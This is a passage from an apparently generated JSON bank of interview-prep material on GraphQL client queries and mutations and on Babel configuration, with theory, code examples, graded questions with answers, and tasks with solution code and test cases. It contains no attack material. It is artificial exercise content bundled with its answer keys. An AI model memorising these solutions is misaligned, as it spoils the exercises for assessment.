          "content": "GraphQL is a powerful query language for APIs, providing a more efficient, powerful, and flexible alternative to REST. Clients like Apollo Client (implied by the provided code using `client.query` and `client.mutate` with `gql` tag) allow frontend applications to interact with GraphQL servers.\n\n## GraphQL Queries\nQueries in GraphQL are used to fetch data from a server. They are declarative, meaning you specify exactly what data you need, and the server returns only that data, avoiding over-fetching or under-fetching issues common with REST APIs. Queries can accept variables to make them dynamic, allowing for parameterized data requests (e.g., fetching a user by ID).\n\n### Structure of a Query\nA GraphQL query specifies the operation type (`query`), an optional operation name (`GetUser`), and variables (`$id: ID!`). Inside the curly braces, you define the fields you want to retrieve, potentially nesting them for related data (e.g., `user` and its `posts`).\n\n## GraphQL Mutations\nMutations are used to modify data on the server. This includes creating, updating, or deleting records. Like queries, mutations are declarative and can accept variables for the data being sent to the server. The response of a mutation typically includes the state of the data after the operation, allowing the client to update its UI or cache accordingly.\n\n### Structure of a Mutation\nA GraphQL mutation specifies the operation type (`mutation`), an optional operation name (`CreatePost`), and variables (`$title: String!, $content: String!, $authorId: ID!`). Within the mutation, you call a server-defined mutation field (e.g., `createPost`) and specify the fields you want to receive back from the server after the operation is complete.\n\n## `gql` Tag and Client Interaction\nModern GraphQL clients often use a `gql` tag (from `graphql-tag` or similar) to parse GraphQL query strings into an Abstract Syntax Tree (AST), which the client can then send to the server. The `client.query` and `client.mutate` methods are typically asynchronous, returning Promises that resolve with the server's response.",
          "examples": [
            {
              "id": "example_graphql_query",
              "title": "GraphQL Query Example: Fetch User Data",
              "code": "import { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\nconst client = new ApolloClient({\n  uri: 'http://localhost:4000/graphql',\n  cache: new InMemoryCache(),\n});\n\nclient.query({\n  query: gql`\n    query GetUser($id: ID!) {\n      user(id: $id) {\n        id\n        name\n        email\n        posts {\n          id\n          title\n        }\n      }\n    }\n  `,\n  variables: { id: \"1\" }\n}).then(result => console.log('Query Result:', result.data))\n  .catch(error => console.error('Query Error:', error));",
              "explanation": "This example demonstrates fetching user data using a GraphQL query. The `GetUser` query specifies an `id` variable to retrieve a specific user. It asks for the user's `id`, `name`, `email`, and a list of their `posts`, including each post's `id` and `title`. The `variables` object passes the actual `id` value. The `.then()` block logs the data received from the server.",
              "language": "typescript"
            },
            {
              "id": "example_graphql_mutation",
              "title": "GraphQL Mutation Example: Create a New Post",
              "code": "import { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\nconst client = new ApolloClient({\n  uri: 'http://localhost:4000/graphql',\n  cache: new InMemoryCache(),\n});\n\nclient.mutate({\n  mutation: gql`\n    mutation CreatePost($title: String!, $content: String!, $authorId: ID!) {\n      createPost(title: $title, content: $content, authorId: $authorId) {\n        id\n        title\n      }\n    }\n  `,\n  variables: {\n    title: \"New Post From Client\",\n    content: \"This is the content of the new post.\",\n    authorId: \"1\"\n  }\n}).then(result => console.log('Mutation Result:', result.data))\n  .catch(error => console.error('Mutation Error:', error));",
              "explanation": "This example shows how to perform a mutation to create a new post. The `CreatePost` mutation defines variables for `title`, `content`, and `authorId`. The `createPost` field is called on the server, and the client requests the `id` and `title` of the newly created post back in the response. The `variables` object provides the actual data for the new post.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "GraphQL",
            "API",
            "Data Fetching",
            "Mutations",
            "Queries",
            "Apollo Client"
          ],
          "technology": "GraphQL",
          "prerequisites": [
            "JavaScript_Promises",
            "HTTP_Requests",
            "Basic_API_Concepts"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "GraphQL_Backend_Integration",
            "Real-time_Data_with_Subscriptions"
          ]
        },
        {
          "id": "theory_babel_transpilation",
          "title": "Babel: JavaScript Transpilation for Compatibility",
          "content": "Babel is a powerful JavaScript compiler, often referred to as a transpiler. Its primary role in modern web development is to transform JavaScript code written with modern syntax (ES6+ features) into backward-compatible versions that can run on older browsers and environments that do not fully support the latest ECMAScript specifications.\n\n## Why Babel is Essential\nJavaScript evolves rapidly, introducing new syntax features (like arrow functions, classes, `let`/`const`, async/await, etc.) that improve developer productivity and code readability. However, not all browsers or Node.js environments immediately support these new features. Babel bridges this gap, allowing developers to write future-proof JavaScript today while ensuring broad compatibility for their applications.\n\n## Key Features of Babel\nBabel works by parsing modern JavaScript code into an Abstract Syntax Tree (AST), applying transformations (via plugins), and then generating new code from the transformed AST. This process effectively 'translates' high-level syntax into lower-level, more widely supported syntax.\n\n### Transformation Examples\n-   **Arrow Functions:** Converts `const add = (a, b) => a + b;` to `var add = function(a, b) { return a + b; };`.\n-   **Class Syntax:** Transforms `class Person { ... }` into traditional ES5 constructor functions and prototype-based methods.\n-   **`let`/`const`:** Converts these to `var` declarations (with appropriate scope handling).\n-   **Object Destructuring, Spread Syntax, Template Literals:** Converts these into equivalent ES5 operations.\n\n## Basic Configuration (`babel.config.js`)\nBabel's behavior is controlled via configuration files, commonly `babel.config.js` or `.babelrc`. These files specify which presets and plugins Babel should use during transpilation.\n\n-   **Presets:** A preset is a shareable set of Babel plugins. They are designed to transpile specific sets of features or for specific environments (e.g., all ES2015+ features, React JSX, TypeScript).\n-   **Plugins:** A plugin is a smaller, more granular transformation. Plugins handle a very specific syntactic transformation (e.g., transforming class properties).\n\n## Common Babel Presets\n-   **`@babel/preset-env`**: This is a 'smart' preset that determines which JavaScript features need to be transformed based on the specified target environments (e.g., specific browser versions, Node.js versions). It uses `browserslist` configuration to only apply necessary transformations, leading to smaller bundle sizes and faster compilation.\n    -   `targets`: Defines the target browsers or Node.js environments.\n    -   `useBuiltIns`: When set to `'usage'` or `'entry'`, it automatically adds `core-js` polyfills based on actual usage in your code or all features for the specified targets, respectively. This prevents including unnecessary polyfills.\n    -   `corejs`: Specifies the `core-js` version to use for polyfills.\n-   **`@babel/preset-react`**: This preset is essential for React development as it transforms JSX (JavaScript XML) syntax into `React.createElement()` calls, which browsers can understand.\n-   **`@babel/preset-typescript`**: This preset adds support for transpiling TypeScript code, allowing you to use TypeScript features without needing to compile TypeScript separately (though type checking still requires a TypeScript compiler).",
          "examples": [
            {
              "id": "example_babel_arrow_function",
              "title": "Babel Transpilation: Arrow Function",
              "code": "// ES6 arrow function\nconst add = (a, b) => a + b;\n\n// Transformed to ES5 by Babel\nvar add = function(a, b) {\n  return a + b;\n};",
              "explanation": "This example illustrates how Babel transforms a modern ES6 arrow function into its equivalent ES5 function expression, ensuring compatibility with older JavaScript environments.",
              "language": "javascript"
            },
            {
              "id": "example_babel_class_syntax",
              "title": "Babel Transpilation: Class Syntax",
              "code": "// ES6 class syntax\nclass Person {\n  constructor(name) {\n    this.name = name;\n  }\n  sayHello() {\n    return `Hello, ${this.name}`;\n  }\n}\n\n// Transformed to ES5 by Babel (simplified example)\nfunction Person(name) {\n  this.name = name;\n}\nPerson.prototype.sayHello = function() {\n  return 'Hello, ' + this.name;\n};",
              "explanation": "This demonstrates Babel's transformation of ES6 class syntax into traditional ES5 constructor functions and prototype methods, which is how object-oriented programming was commonly achieved in older JavaScript versions.",
              "language": "javascript"
            },
            {
              "id": "example_babel_config",
              "title": "Babel Configuration File (`babel.config.js`)",
              "code": "// babel.config.js\nmodule.exports = {\n  presets: [\n    [\"@babel/preset-env\", {\n      targets: {\n        browsers: [\"last 2 versions\", \"not dead\"],\n      },\n      useBuiltIns: \"usage\",\n      corejs: 3\n    }],\n    \"@babel/preset-react\" // For React JSX transformation\n  ],\n  plugins: [\n    \"@babel/plugin-proposal-class-properties\",\n    \"@babel/plugin-transform-runtime\"\n  ]\n};",
              "explanation": "This configuration file shows how to set up Babel with common presets and plugins. `preset-env` targets modern browsers and includes polyfills for features used. `preset-react` handles JSX. Plugins like `plugin-proposal-class-properties` and `plugin-transform-runtime` add support for specific experimental features or optimize helper functions.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "JavaScript",
            "Transpilation",
            "Babel",
            "Build Tools",
            "ES6",
            "ES5",
            "Frontend Tooling",
            "Presets",
            "Plugins"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JavaScript_Fundamentals",
            "ES6_Features",
            "Node.js_Basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Webpack_Integration",
            "Modern_Frontend_Development",
            "React_Development"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_graphql_query_vs_mutation_mcq",
          "topic": "GraphQL Queries vs. Mutations",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following best describes the primary use case for a GraphQL Query?",
          "answer": "To retrieve data from the server without modifying it.",
          "options": [
            "To modify existing data on the server.",
            "To subscribe to real-time data updates.",
            "To retrieve data from the server without modifying it.",
            "To define the schema of the GraphQL API."
          ],
          "analysisPoints": [
            "Queries are read operations.",
            "Mutations are write operations (create, update, delete).",
            "Subscriptions are for real-time data.",
            "Schema definition is server-side, not a client-side operation type."
          ],
          "keyConcepts": [
            "GraphQL Query",
            "GraphQL Mutation",
            "Data Fetching"
          ],
          "evaluationCriteria": [
            "Understanding of GraphQL operation types.",
            "Ability to distinguish between data retrieval and modification."
          ],
          "example": "GraphQL Queries are analogous to GET requests in REST, used purely for fetching information. Mutations are like POST, PUT, DELETE requests, used for changing server-side data.",
          "tags": [
            "GraphQL",
            "Query",
            "Basics"
          ],
          "prerequisites": [
            "GraphQL_Client_Operations"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_graphql_variable_usage_open",
          "topic": "GraphQL Variables",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of using `variables` in GraphQL queries and mutations, and provide a brief example of how they are passed to a client method.",
          "answer": "Variables in GraphQL queries and mutations allow for dynamic values to be passed into an operation, making the operations reusable and preventing string concatenation for input data, which can lead to security vulnerabilities (like injection). They are defined with a `$` prefix and a type in the operation definition (e.g., `$id: ID!`) and then referenced within the query/mutation body. On the client-side, they are typically passed as a separate JavaScript object to the `variables` property of the `query` or `mutate` method.\n\n**Example:**\n```typescript\n// GraphQL operation definition\nconst GET_PRODUCT = gql`\n  query GetProductDetails($productId: ID!) {\n    product(id: $productId) {\n      name\n      price\n    }\n  }\n`;\n\n// Client-side execution\nclient.query({\n  query: GET_PRODUCT,\n  variables: { productId: \"abc-123\" }\n}).then(result => console.log(result.data.product));\n```",
          "analysisPoints": [
            "Reusability of operations.",
            "Prevention of injection attacks.",
            "Clear separation of operation logic and input data.",
            "Correct syntax for defining and passing variables."
          ],
          "keyConcepts": [
            "GraphQL Variables",
            "Parameterization",
            "Security"
          ],
          "evaluationCriteria": [
            "Understanding of dynamic data input in GraphQL.",
            "Ability to explain benefits and demonstrate usage."
          ],
          "example": null,
          "tags": [
            "GraphQL",
            "Variables",
            "Best Practices"
          ],
          "prerequisites": [
            "GraphQL_Client_Operations"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_graphql_create_post_code",
          "topic": "GraphQL Mutation Coding",
          "level": "medium",
          "type": "code",
          "question": "Given the following GraphQL mutation definition, write the JavaScript code snippet using an Apollo-like client (`client.mutate`) to create a new post with a title 'My New Article', content 'This is the body.', and author ID '5'. Log the `id` and `title` of the created post from the response.",
          "answer": "```typescript\nimport { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\nconst client = new ApolloClient({\n  uri: 'http://localhost:4000/graphql',\n  cache: new InMemoryCache(),\n});\n\nconst CREATE_POST_MUTATION = gql`\n  mutation CreatePost($title: String!, $content: String!, $authorId: ID!) {\n    createPost(title: $title, content: $content, authorId: $authorId) {\n      id\n      title\n    }\n  }\n`;\n\nclient.mutate({\n  mutation: CREATE_POST_MUTATION,\n  variables: {\n    title: \"My New Article\",\n    content: \"This is the body.\",\n    authorId: \"5\"\n  }\n}).then(result => {\n  if (result.data && result.data.createPost) {\n    console.log(`Created Post ID: ${result.data.createPost.id}`);\n    console.log(`Created Post Title: ${result.data.createPost.title}`);\n  } else {\n    console.warn('Post creation might have failed or returned unexpected data.');\n  }\n}).catch(error => console.error('Error creating post:', error));\n```",
          "analysisPoints": [
            "Correctly uses `client.mutate`.",
            "Passes the GraphQL mutation string using `gql`.",
            "Correctly structures the `variables` object.",
            "Accesses nested data in the `result.data` object.",
            "Includes basic error handling with `.catch()`."
          ],
          "keyConcepts": [
            "GraphQL Mutation",
            "Apollo Client",
            "Variables",
            "Asynchronous Operations"
          ],
          "evaluationCriteria": [
            "Ability to translate GraphQL definition to client code.",
            "Correct usage of `variables`.",
            "Understanding of promise-based API calls.",
            "Basic response parsing."
          ],
          "example": null,
          "tags": [
            "GraphQL",
            "Coding",
            "Mutation",
            "Intermediate"
          ],
          "prerequisites": [
            "GraphQL_Client_Operations"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_graphql_flashcard_gql_tag",
          "topic": "GraphQL Client Basics",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `gql` tag (e.g., `gql` from `graphql-tag` or Apollo Client) when writing GraphQL operations in JavaScript?",
          "answer": "To parse GraphQL query strings into an Abstract Syntax Tree (AST), making them understandable and processable by the GraphQL client library.",
          "analysisPoints": [],
          "keyConcepts": [
            "GraphQL",
            "gql tag",
            "AST"
          ],
          "evaluationCriteria": [
            "Recall of basic GraphQL client components."
          ],
          "example": null,
          "tags": [
            "GraphQL",
            "Flashcard",
            "Tooling"
          ],
          "prerequisites": [
            "GraphQL_Client_Operations"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_babel_purpose_mcq",
          "topic": "Babel Core Purpose",
          "level": "easy",
          "type": "mcq",
          "question": "What is the primary function of Babel in modern JavaScript development?",
          "answer": "To transpile modern JavaScript code into backward-compatible versions for older environments.",
          "options": [
            "To manage project dependencies and packages.",
            "To transpile modern JavaScript code into backward-compatible versions for older environments.",
            "To optimize CSS and HTML for production.",
            "To bundle multiple JavaScript files into a single output file."
          ],
          "analysisPoints": [
            "Babel is a transpiler/compiler.",
            "Its focus is on syntax transformation, not dependency management (like npm/yarn), CSS/HTML optimization, or bundling (like Webpack/Rollup)."
          ],
          "keyConcepts": [
            "Babel",
            "Transpilation",
            "Compatibility"
          ],
          "evaluationCriteria": [
            "Understanding of Babel's core role.",
            "Distinguishing Babel from other build tools."
          ],
          "example": "Without Babel, many modern ES6+ features like arrow functions or classes would not run on older browsers such as Internet Explorer 11.",
          "tags": [
            "Babel",
            "Transpilation",
            "Fundamentals"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_babel_preset_env_open",
          "topic": "Babel Presets: `@babel/preset-env`",
          "level": "medium",
          "type": "open",
          "question": "Describe the main purpose of `@babel/preset-env` and explain how its `targets` and `useBuiltIns` options contribute to efficient JavaScript transpilation.",
          "answer": "`@babel/preset-env` is a 'smart' Babel preset that allows you to use the latest JavaScript features without needing to manage specific syntax transforms (plugins) manually. Its main purpose is to automatically determine the necessary Babel plugins and core-js polyfills based on your specified target environments.\n\n-   **`targets`**: This option allows you to specify the browser versions, Node.js versions, or other environments your code needs to support (e.g., `browsers: [\"last 2 versions\", \"not dead\"]`). Based on these targets, `preset-env` intelligently includes only the transformations and polyfills required by those specific environments. This prevents unnecessary transpilation and polyfilling, resulting in smaller bundle sizes and potentially faster build times.\n\n-   **`useBuiltIns`**: This option controls how polyfills from `core-js` are injected. When set to `'usage'`, `preset-env` analyzes your code and adds polyfills only for the features actually used. When set to `'entry'`, it imports all required polyfills for the specified `targets` at the very beginning of your application. Both options aim to avoid including redundant polyfills, optimizing the final bundle size. Using `'usage'` is generally preferred for optimal bundle size as it's more granular, but `'entry'` can be simpler for polyfilling an entire application's environment.",
          "analysisPoints": [
            "Understanding of adaptive transpilation.",
            "How `targets` optimize output size.",
            "How `useBuiltIns` manages polyfills efficiently.",
            "Distinction between `'usage'` and `'entry'` for `useBuiltIns`."
          ],
          "keyConcepts": [
            "Babel",
            "preset-env",
            "Polyfills",
            "Targets",
            "useBuiltIns"
          ],
          "evaluationCriteria": [
            "Comprehensive explanation of preset-env.",
            "Detailed understanding of configuration options and their impact.",
            "Ability to explain optimization benefits."
          ],
          "example": null,
          "tags": [
            "Babel",
            "Configuration",
            "Optimization",
            "Advanced"
          ],
          "prerequisites": [
            "Babel_JavaScript_Transpilation"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_babel_jsx_flashcard",
          "topic": "Babel Presets",
          "level": "easy",
          "type": "flashcard",
          "question": "Which Babel preset is specifically responsible for transforming JSX syntax into standard JavaScript (e.g., `React.createElement` calls)?",
          "answer": "`@babel/preset-react`",
          "analysisPoints": [],
          "keyConcepts": [
            "Babel",
            "JSX",
            "React"
          ],
          "evaluationCriteria": [
            "Recall of specific Babel preset functionalities."
          ],
          "example": null,
          "tags": [
            "Babel",
            "React",
            "Flashcard"
          ],
          "prerequisites": [
            "Babel_JavaScript_Transpilation"
          ],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_babel_es6_to_es5_code",
          "topic": "Babel Transformation",
          "level": "medium",
          "type": "code",
          "question": "Given the following ES6 code snippet, show how Babel would typically transform it into ES5-compatible code. Assume a basic setup with `preset-env`.",
          "answer": "```javascript\n// ES6 Code Input:\nconst multiply = (x, y) => x * y;\n\nclass Calculator {\n  constructor(initialValue) {\n    this.value = initialValue;\n  }\n  add(num) {\n    return this.value + num;\n  }\n}\n\n// ES5 Transformed Code (by Babel):\nvar multiply = function(x, y) {\n  return x * y;\n};\n\nfunction Calculator(initialValue) {\n  this.value = initialValue;\n}\n\nCalculator.prototype.add = function(num) {\n  return this.value + num;\n};\n```",
          "analysisPoints": [
            "Correct transformation of arrow function to traditional function expression.",
            "Correct transformation of class syntax to constructor function and prototype methods.",
            "Understanding of `const` vs `var` implications (though simple `var` is shown here for brevity)."
          ],
          "keyConcepts": [
            "Babel",
            "ES6 to ES5",
            "Arrow Functions",
            "Classes",
            "Transpilation"
          ],
          "evaluationCriteria": [
            "Ability to demonstrate fundamental Babel transformations.",
            "Knowledge of ES5 equivalents for modern JavaScript features."
          ],
          "example": null,
          "tags": [
            "Babel",
            "Coding",
            "ES6",
            "ES5"
          ],
          "prerequisites": [
            "Babel_JavaScript_Transpilation",
            "ES6_Features"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_babel_plugins_flashcard",
          "topic": "Babel Components",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the difference between a Babel 'preset' and a Babel 'plugin'?",
          "answer": "A **plugin** is a small JavaScript program that transforms specific syntax, handling a single type of transformation (e.g., converting arrow functions). A **preset** is a collection of plugins, often grouped by a particular year's ECMAScript features (e.g., `preset-env` for all modern JS features) or a specific library's syntax (e.g., `preset-react` for JSX). Presets simplify configuration by bundling related plugins.",
          "analysisPoints": [],
          "keyConcepts": [
            "Babel",
            "Plugins",
            "Presets"
          ],
          "evaluationCriteria": [
            "Recall of Babel architectural components."
          ],
          "example": null,
          "tags": [
            "Babel",
            "Configuration",
            "Flashcard"
          ],
          "prerequisites": [
            "Babel_JavaScript_Transpilation"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_graphql_mock_client",
          "title": "Simulate GraphQL Client Interactions",
          "description": "\nImplement a `MockGraphQLClient` class that simulates basic GraphQL query and mutation operations. Your client should:\n\n1.  Have a `query` method that takes an object with `query` (a string) and `variables` properties. It should return a Promise that resolves with a mock data structure based on the query string.\n2.  Have a `mutate` method that takes an object with `mutation` (a string) and `variables` properties. It should return a Promise that resolves with a mock data structure based on the mutation string.\n3.  For `query`, if the query string contains 'GetUser', return mock user data. If it contains 'GetPosts', return mock posts data.\n4.  For `mutate`, if the mutation string contains 'CreatePost', simulate creation by returning a mock new post object incorporating the input variables.\n5.  Include basic error handling (e.g., reject the promise if no matching operation is found).\n\nThis task focuses on understanding the client-side interaction pattern with GraphQL, rather than actual server communication.\n",
          "difficulty": "medium",
          "startingCode": "import { gql } from '@apollo/client'; // Assume gql is available for parsing, or simplify\n\n// Mock data for queries\nconst MOCK_USER_DATA = {\n  user: {\n    id: '101',\n    name: 'Alice Smith',\n    email: 'alice@example.com',\n    posts: [\n      { id: 'p1', title: 'My First Blog' },\n      { id: 'p2', title: 'GraphQL Basics' }\n    ]\n  }\n};\n\nconst MOCK_POSTS_DATA = {\n  posts: [\n    { id: 'p1', title: 'Post One' },\n    { id: 'p2', title: 'Post Two' },\n  ]\n};\n\nclass MockGraphQLClient {\n  constructor(uri) {\n    this.uri = uri;\n  }\n\n  query({ query, variables }) {\n    console.log('Mock Query Received:', { query, variables });\n    return new Promise((resolve, reject) => {\n      // TODO: Implement logic to return mock data based on query string\n      // Check if query string contains 'GetUser' or 'GetPosts'\n      // Resolve with { data: MOCK_USER_DATA } or { data: MOCK_POSTS_DATA }\n      // Reject for unknown queries\n    });\n  }\n\n  mutate({ mutation, variables }) {\n    console.log('Mock Mutation Received:', { mutation, variables });\n    return new Promise((resolve, reject) => {\n      // TODO: Implement logic to return mock data based on mutation string\n      // Check if mutation string contains 'CreatePost'\n      // Resolve with { data: { createPost: { id: 'new-id', title: variables.title } } }\n      // Reject for unknown mutations\n    });\n  }\n}\n\n// Example Usage (for testing your implementation)\nconst client = new MockGraphQLClient('http://mock-graphql.com/graphql');\n\n// Test Query\nclient.query({\n  query: gql`query GetUser($id: ID!) { user(id: $id) { name } }`,\n  variables: { id: '1' }\n}).then(result => console.log('Query Result:', result.data))\n  .catch(error => console.error('Query Error:', error));\n\n// Test Mutation\nclient.mutate({\n  mutation: gql`mutation CreatePost($title: String!) { createPost(title: $title) { id title } }`,\n  variables: { title: 'My New Mock Post' }\n}).then(result => console.log('Mutation Result:', result.data))\n  .catch(error => console.error('Mutation Error:', error));\n",
          "solutionCode": "import { gql } from '@apollo/client';\n\nconst MOCK_USER_DATA = {\n  user: {\n    id: '101',\n    name: 'Alice Smith',\n    email: 'alice@example.com',\n    posts: [\n      { id: 'p1', title: 'My First Blog' },\n      { id: 'p2', title: 'GraphQL Basics' }\n    ]\n  }\n};\n\nconst MOCK_POSTS_DATA = {\n  posts: [\n    { id: 'p1', title: 'Post One' },\n    { id: 'p2', title: 'Post Two' },\n  ]\n};\n\nclass MockGraphQLClient {\n  constructor(uri) {\n    this.uri = uri;\n  }\n\n  query({ query, variables }) {\n    console.log('Mock Query Received:', { query: query.loc.source.body.trim().split(/\\s+/)[1], variables });\n    return new Promise((resolve, reject) => {\n      setTimeout(() => { // Simulate network delay\n        if (query.loc.source.body.includes('GetUser')) {\n          resolve({ data: MOCK_USER_DATA });\n        } else if (query.loc.source.body.includes('GetPosts')) {\n          resolve({ data: MOCK_POSTS_DATA });\n        } else {\n          reject(new Error('Unknown mock query operation.'));\n        }\n      }, 100);\n    });\n  }\n\n  mutate({ mutation, variables }) {\n    console.log('Mock Mutation Received:', { mutation: mutation.loc.source.body.trim().split(/\\s+/)[1], variables });\n    return new Promise((resolve, reject) => {\n      setTimeout(() => { // Simulate network delay\n        if (mutation.loc.source.body.includes('CreatePost')) {\n          const newPostId = `p${Math.floor(Math.random() * 100000)}`;\n          const createdPost = {\n            id: newPostId,\n            title: variables.title || 'Untitled Post',\n            content: variables.content || 'No content provided',\n            authorId: variables.authorId || 'unknown'\n          };\n          resolve({ data: { createPost: { id: createdPost.id, title: createdPost.title } } });\n        } else {\n          reject(new Error('Unknown mock mutation operation.'));\n        }\n      }, 100);\n    });\n  }\n}\n\n// Example Usage (for testing your implementation)\nconst client = new MockGraphQLClient('http://mock-graphql.com/graphql');\n\n// Test Query\nclient.query({\n  query: gql`query GetUser($id: ID!) { user(id: $id) { name } }`,\n  variables: { id: '1' }\n}).then(result => console.log('Query Result:', result.data))\n  .catch(error => console.error('Query Error:', error));\n\nclient.query({\n  query: gql`query GetPosts { posts { id title } }`,\n  variables: {}\n}).then(result => console.log('Query Result:', result.data))\n  .catch(error => console.error('Query Error:', error));\n\n// Test Mutation\nclient.mutate({\n  mutation: gql`mutation CreatePost($title: String!, $content: String!) { createPost(title: $title, content: $content) { id title } }`,\n  variables: { title: 'My New Mock Post', content: 'This is some mock content.' }\n}).then(result => console.log('Mutation Result:', result.data))\n  .catch(error => console.error('Mutation Error:', error));\n\n// Test unknown operation\nclient.query({\n  query: gql`query InvalidQuery { invalid { field } }`\n}).catch(error => console.error('Expected Error (Invalid Query):', error.message));\n",
          "testCases": [
            "Call `client.query` with a 'GetUser' query string and verify it resolves with `MOCK_USER_DATA`.",
            "Call `client.query` with a 'GetPosts' query string and verify it resolves with `MOCK_POSTS_DATA`.",
            "Call `client.mutate` with a 'CreatePost' mutation string and verify it resolves with a new post object containing the provided `title` and a generated `id`.",
            "Call `client.query` or `client.mutate` with an unrecognized operation and verify that the promise rejects with an appropriate error.",
            "Ensure `variables` are correctly logged/used in the mock operation for mutations."
          ],
          "hints": [
            "Use `String.prototype.includes()` to check for operation names within the `query` or `mutation` string.",
            "Remember that the `gql` tagged template literal produces an object with a `loc.source.body` property containing the raw string if you're simulating without full AST parsing.",
            "Wrap the mock data resolution in a `setTimeout` to simulate asynchronous network requests."
          ],
          "tags": [
            "GraphQL",
            "Client",
            "Mocking",
            "Promises",
            "OOP"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "JavaScript_Promises",
            "GraphQL_Client_Operations",
            "ES6_Classes"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Asynchronous_JavaScript",
            "Testing_Strategies"
          ]
        },
        {
          "id": "task_babel_config_setup",
          "title": "Configure Babel for a Frontend Project",
          "description": "\nSet up a basic Babel configuration for a new frontend project. Your configuration should:\n\n1.  Transpile modern JavaScript (ES6+ syntax) to ES5 for broad browser compatibility.\n2.  Specifically target browsers that are 'last 2 versions' and 'not dead'.\n3.  Include polyfills only for features that are actually used in the code, leveraging `core-js` version 3.\n4.  Enable support for JSX syntax, assuming a React project.\n5.  Include support for Class Properties (e.g., `class MyComponent { myProp = 1; }`).\n\nProvide the `babel.config.js` file content and explain why each part is included. You don't need to write actual JavaScript code, just the configuration.\n",
          "difficulty": "medium",
          "startingCode": "/*\n  Task: Create babel.config.js\n\n  Your module.exports object should contain:\n  - presets array\n  - plugins array\n\n  Consider these requirements:\n  1. ES6+ to ES5 compatibility (use `preset-env`)\n  2. Browser targeting (`targets` option)\n  3. Usage-based polyfilling (`useBuiltIns`, `corejs`)\n  4. JSX support (`preset-react`)\n  5. Class Properties support (`plugin-proposal-class-properties`)\n*/\n\n// babel.config.js (Your solution will go here)\nmodule.exports = {\n  // TODO: Add your Babel presets and plugins here\n};\n",
          "solutionCode": "// babel.config.js\nmodule.exports = {\n  presets: [\n    [\"@babel/preset-env\", {\n      targets: {\n        browsers: [\"last 2 versions\", \"not dead\"],\n      },\n      useBuiltIns: \"usage\",\n      corejs: 3\n    }],\n    \"@babel/preset-react\"\n  ],\n  plugins: [\n    \"@babel/plugin-proposal-class-properties\"\n  ]\n};\n\n/*\nExplanation of Solution:\n\n- `@babel/preset-env`:\n  - `targets: { browsers: [\"last 2 versions\", \"not dead\"] }`: This configuration tells Babel to transpile JavaScript features only if they are not supported by the specified browser targets. 'last 2 versions' covers the two most recent versions of major browsers, and 'not dead' excludes browsers that are no longer officially supported.\n  - `useBuiltIns: \"usage\"`: This setting ensures that polyfills from `core-js` are included only for the specific JavaScript features (e.g., `Promise`, `Array.prototype.includes`) that are actually used in your codebase and are missing in your target environments. This minimizes bundle size.\n  - `corejs: 3`: Specifies that `core-js` version 3 should be used for polyfilling. It's crucial to have `core-js` installed as a dependency (`npm install core-js`).\n\n- `@babel/preset-react`:\n  - This preset is responsible for transforming JSX syntax (used extensively in React) into standard JavaScript function calls (e.g., `React.createElement`). This allows browsers to understand and render React components.\n\n- `@babel/plugin-proposal-class-properties`:\n  - This plugin enables support for the class properties syntax (e.g., `myProperty = 'value';` directly inside a class, without needing `this.myProperty = 'value';` in the constructor). This is a stage 3 ECMAScript proposal that provides a more concise way to define properties on a class instance.\n*/\n",
          "testCases": [
            "Verify `preset-env` is present with correct `targets`, `useBuiltIns`, and `corejs` options.",
            "Verify `preset-react` is included.",
            "Verify `plugin-proposal-class-properties` is included.",
            "Ensure no unnecessary presets/plugins are added."
          ],
          "hints": [
            "Remember that `preset-env` needs an array for its options.",
            "Think about what each requirement translates to in terms of Babel components (presets vs. plugins).",
            "The `plugin-transform-runtime` is often used but not explicitly required by the prompt's `class properties` mention, so consider if it's strictly necessary based on the requirements."
          ],
          "tags": [
            "Babel",
            "Configuration",
            "Frontend Tooling",
            "React",
            "ES6"
          ],
          "timeEstimate": 40,
          "prerequisites": [
            "Babel_JavaScript_Transpilation",
            "ES6_Classes"
          ],
          "complexity": 6,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Webpack",
            "Polyfills",
            "Browserslist"
          ]
        }
      ]
    }
  },
  {
    "id": "926ec145-0d15-49eb-8c97-a731bcaa855c",
    "startLine": 13300,
    "endLine": 13399,
    "processedDate": "2025-06-17T13:25:38.680Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_webpack_fundamentals",
          "title": "Webpack Fundamentals: Basic Configuration and Core Concepts",
